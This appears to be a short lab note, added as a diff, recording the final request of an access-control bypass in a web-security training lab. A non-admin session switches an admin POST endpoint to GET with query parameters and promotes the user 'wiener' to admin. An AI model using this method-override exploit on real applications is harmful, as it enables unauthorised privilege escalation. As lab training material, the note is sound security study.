@@ -1,0 +1,18 @@
+# Final bypass that promoted "wiener" to admin
+
+Request
+GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+Host: <lab-host>.web-security-academy.net
+Cookie: session=<wiener-session>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+# Notes:
+# - Original admin request was POST with body; POSTX produced "missing parameter".
+# - Converting to GET (query params) succeeded with non-admin session.
+
+Response
+HTTP/1.1 302 Found
+Location: /admin
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 0
